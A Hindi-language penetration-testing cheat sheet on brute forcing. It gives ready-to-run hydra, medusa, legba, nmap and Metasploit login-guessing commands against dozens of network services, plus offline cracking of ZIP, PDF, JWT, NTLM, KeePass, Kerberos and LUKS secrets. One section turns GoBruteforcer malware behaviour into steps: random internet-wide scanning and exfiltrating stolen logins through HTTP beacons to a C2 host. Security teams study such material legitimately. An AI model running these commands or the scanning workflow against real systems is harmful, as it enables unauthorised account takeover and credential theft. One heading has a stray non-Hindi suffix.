# Brute Force - चीटशीट

{{#include ../banners/hacktricks-training.md}}

## डिफ़ॉल्ट क्रेडेंशियल्स

जिस तकनीक का उपयोग किया जा रहा है, उसके डिफ़ॉल्ट क्रेडेंशियल्स **Google पर खोजें**, या **इन लिंक को आज़माएँ**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **अपनी डिक्शनरी बनाएँ**

टारगेट के बारे में जितनी हो सके उतनी जानकारी जुटाएँ और एक कस्टम डिक्शनरी बनाएँ। ये टूल मददगार हो सकते हैं:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### वेबसाइट-आधारित wordlists

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

पीड़ित के बारे में आपकी जानकारी (नाम, तारीखें...) के आधार पर पासवर्ड जनरेट करें।

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

एक wordlist generator tool, जिसमें आप शब्दों का एक सेट दे सकते हैं और उनसे कई variations बना सकते हैं। इससे किसी खास target के लिए एक अनूठी और उपयुक्त wordlist तैयार की जा सकती है।

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### वर्डलिस्ट

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## इंटरनेट-व्यापी bruteforcer वर्कफ़्लो (Go-आधारित scanners से मिले सबक)

GoBruteforcer malware के scanning वर्कफ़्लो में निम्नलिखित व्यवहार देखे गए; सटीक मान नमूने के अनुसार अलग-अलग होते हैं।<sup>[[1]](#references)</sup>

- **आर्किटेक्चर के अनुसार अनुकूलित worker pools** बनाए रखें (उदाहरण के लिए, `x86_64/arm64` पर 95 समवर्ती workers, `i686` पर 85, `armv5tel` पर 35 और अन्य आर्किटेक्चर पर डिफ़ॉल्ट रूप से 50), हर सेकंड सक्रिय workers की जाँच करें और संख्या लक्ष्य से कम होने पर नए workers शुरू करें; प्रत्येक worker बाहर निकलने से पहले अधिकतम एक target IP संभालता है।
- **यादृच्छिक सार्वजनिक IPv4s** बनाएँ, लेकिन स्पष्ट रूप से routable न होने वाली और चुनी हुई operator-avoided ranges को छोड़ दें: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) और DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`)।
- **Service port को probe करें** और **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, HTTP/80 पर phpMyAdmin) आज़माने से पहले कम timeout (~2s) रखें; C2 credential fetch विफल होने पर छोटी builtin credential list का उपयोग करें।
- सामान्य browser User-Agent का फिर से उपयोग करते हुए, `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` जैसे छोटे HTTP GET beacons के ज़रिए **hits exfiltrate करें** (service codes जैसे `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) ताकि ट्रैफ़िक सामान्य लगे।
- **phpMyAdmin spray** में `GET /index.php?lang=en` के साथ लगभग 80 संभावित paths पर brute-force किया जा सकता है; PMA markers (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) का पता लगाएँ और auth के लिए `codemirror.css?v=X.Y.Z` को parse करके शाखा चुनें: `<4.9` versions में GET params `pma_username`/`pma_password` स्वीकार किए जाते हैं; `>=4.9` versions में `server=1`, CSRF `token` और वही creds इस्तेमाल करके POST करें।

## Services

Service name के अनुसार वर्णानुक्रम में।

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM और Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP सामान्य Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - पोस्ट फ़ॉर्म

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

http**s** के लिए, आपको "http-post-form" को "**https-post-form" में बदलना होगा

### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

**patator** के साथ **oracle_login** का उपयोग करने के लिए आपको **इंस्टॉल** करना होगा:

```bash
pip3 install cx_Oracle --upgrade
```

[ऑफ़लाइन OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

इंस्टॉल करने के लिए `.deb` पैकेज [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) से डाउनलोड कर सकते हैं।

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### कमजोर SSH keys / Debian predictable PRNG

कुछ systems में cryptographic material बनाने के लिए इस्तेमाल किए जाने वाले random seed में ज्ञात खामियाँ होती हैं। इससे keyspace काफी कम हो सकता है, जिसे [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) जैसे tools से bruteforce किया जा सकता है। कमजोर keys के पहले से तैयार sets भी उपलब्ध हैं, जैसे [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)।

### STOMP (ActiveMQ, RabbitMQ, HornetQ और OpenMQ)

STOMP text protocol एक व्यापक रूप से इस्तेमाल किया जाने वाला messaging protocol है, जो RabbitMQ, ActiveMQ, HornetQ और OpenMQ जैसी लोकप्रिय message queueing services के साथ **बिना रुकावट संचार और परस्पर क्रिया की सुविधा देता है**। यह messages का आदान-प्रदान करने और messaging से जुड़े विभिन्न operations करने के लिए एक मानकीकृत और कुशल तरीका प्रदान करता है।

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## स्थानीय

### ऑनलाइन cracking डेटाबेस

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 और SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1, ESS/SSP के साथ या बिना, और किसी भी challenge value के साथ)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures और MSOffice, ZIP, PDF...) के archives
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes और file hashes)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Hash को brute force करने की कोशिश करने से पहले इसे देखें।

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Known plaintext zip attack

आपको encrypted zip के अंदर मौजूद किसी फ़ाइल का **plaintext** (या plaintext का कुछ हिस्सा) जानना होगा। आप **`7z l encrypted.zip`** चलाकर encrypted zip के अंदर मौजूद फ़ाइलों के **नाम और आकार** देख सकते हैं।\
[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) को releases पेज से डाउनलोड करें।

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### PDF Owner पासवर्ड

PDF Owner पासवर्ड crack करने के लिए यह देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Lucks इमेज

#### विधि 1

इंस्टॉल करें: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### विधि 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

एक और Luks BF ट्यूटोरियल: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### PGP/GPG निजी कुंजी

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) का उपयोग करें और फिर john चलाएँ

### Open Office पासवर्ड-सुरक्षित कॉलम

यदि आपके पास पासवर्ड से सुरक्षित कॉलम वाली xlsx फ़ाइल है, तो आप उसकी सुरक्षा हटा सकते हैं:

- **इसे Google Drive पर अपलोड करें** और पासवर्ड अपने आप हट जाएगा
- इसे **मैन्युअल रूप से हटाने** के लिए:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### PFX प्रमाणपत्रಗಳು

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## टूल्स
